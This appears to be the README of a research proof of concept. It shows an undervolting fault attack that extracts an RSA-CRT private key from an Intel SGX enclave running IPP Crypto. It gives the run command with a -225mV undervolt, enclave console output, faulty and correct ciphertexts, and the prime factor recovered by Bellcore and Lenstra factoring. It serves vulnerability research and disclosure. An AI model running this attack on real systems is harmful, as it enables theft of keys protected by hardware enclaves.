# Example IV.B: Full Key Extraction from  RSA-CRT  Decryption/Signature in SGX using IPP Crypto

As usual, you need SGX-Step. As usual, we assume it is in `../sgx-step/` - adapt the Makefile (`LIBSGXSTEP_DIR`) if needed. We also assume the SGX-SDK is correctly setup and the environment sourced.

Run on our i3-7100U-A with -225mV:

```
david@bagger$ ARGS="500 -225" make run
[...]
[LD] main.o -o app
[main.c] Creating enclave...
[pt.c] /dev/sgx-step opened!
[main.c] init RSA...
Enclave: Init P...
Enclave: DW: eecfae81
[...]
Enclave: create_BN_state() = 0x7fc61325d060
Enclave: Init Q...Enclave: DW: c97fb1f0
Enclave: DW: 27f453f6
[...]
Enclave: create_BN_state() = 0x7fc61325d128
Enclave: DW: 54494ca6
[...]
Enclave: create_BN_state() = 0x7fc61325d1f0
Enclave: DW: 471e0290
[...]
Enclave: create_BN_state() = 0x7fc61325d2b8
Enclave: DW: b06c4fda
[...]
Enclave: create_BN_state() = 0x7fc61325d380
Enclave: DW: bbf82f09
[...]
Enclave: create_BN_state() = 0x7fc61325d4d8
Enclave: DW: a5dafc53
[...]
Enclave: create_BN_state() = 0x7fc61325d620
Enclave: DW: 00000011
Enclave: create_BN_state() = 0x7fc61325d448
Enclave: DW: 00eb7a19
[...]
Enclave: create_BN_state() = 0x7fc61325d7f8
Enclave: DW: 1253e04d
[...]
Enclave: create_BN_state() = 0x7fc61325d940
[main.c] Now ECCing inside SGX...
[main.c] Thread exiting
[main.c] Done.
Result = 1
0x9f, 0x7b, 0x9c, 0xb8, 0x74, 0xce, 0xf7, 0x52, 0x3e, 0x91, 0x1a, 
0xed, 0x33, 0x55, 0xc8, 0x65, 0xbe, 0xd5, 0xdb, 0x6a, 0x3c, 0x74, 
0x94, 0xb5, 0xad, 0x80, 0xaa, 0x60, 0x77, 0x5a, 0xa6, 0x42, 0x2d, 
0xc2, 0xc4, 0x40, 0xc2, 0xa0, 0xc2, 0x1d, 0x94, 0x19, 0x19, 0x55, 
0xd4, 0xad, 0xa6, 0x49, 0x24, 0x37, 0xf1, 0xca, 0x17, 0xef, 0xa6, 
0xe8, 0x66, 0x56, 0xbf, 0x04, 0x74, 0xa5, 0x2e, 0xec, 0xb6, 0x7b, 
0xac, 0x50, 0xf5, 0x4c, 0x54, 0x29, 0x90, 0x7b, 0xee, 0x3b, 0x98, 
0xe9, 0xde, 0x6b, 0xc1, 0x41, 0x57, 0xcd, 0xc9, 0x1b, 0x70, 0x4c, 
0xd9, 0xd1, 0xe0, 0xac, 0x9b, 0xf9, 0x41, 0xb3, 0x61, 0x32, 0x59, 
0xc7, 0xad, 0xd4, 0x36, 0x29, 0xd2, 0xba, 0xc7, 0xfe, 0xfc, 0x81, 
0xaf, 0x71, 0x69, 0x12, 0x2e, 0xc6, 0x72, 0x1f, 0x55, 0x6d, 0x0a, 
0x9f, 0xd5, 0x36, 0x11, 0x90, 0x7f, 0xa8, 0x00, 0x00, 0x00, 0x00, 
[...]
Noooo!!!!1111elfoelf
[main.c] Exiting...
```

Copying the resulting faulty ciphertext to `Evaluation/eval.py`:

```
Correct: 0xeb7a19ace9e3006350e329504b45e2ca82310b26dcd87d5c68f1eea8f55267
c31b2e8bb4251f84d7e0b2c04626f5aff93edcfb25c9c2b3ff8ae10e839a2ddb4cdcfe4ff
47728b4a1b7c1362baad29ab48d2869d5024121435811591be392f982fb3e87d095aeb404
48db972f3ac14f7bc275195281ce32d2f1b76d4d353e2dL

Faulty:  0xa87f901136d59f0a6d551f72c62e126971af81fcfec7bad22936d4adc75932
61b341f99bace0d1d94c701bc9cd5741c16bdee9983bee7b9029544cf550ac7bb6ec2ea57
404bf5666e8a6ef17caf1372449a6add4551919941dc2a0c240c4c22d42a65a7760aa80ad
b594743c6adbd5be65c85533ed1a913e52f7ce74b89c7b9fL

Factoring with Bellcore: 
0xeecfae81b1b9b3c908810b10a1b5600199eb9f44aef4fda493b81a9e3d84f632124ef02
36e5d1e3b7e28fae7aa040a2d5b252176459d1f397541ba2a58fb6599L

Factoring with Lenstra:  
0xeecfae81b1b9b3c908810b10a1b5600199eb9f44aef4fda493b81a9e3d84f632124ef02
36e5d1e3b7e28fae7aa040a2d5b252176459d1f397541ba2a58fb6599L
```
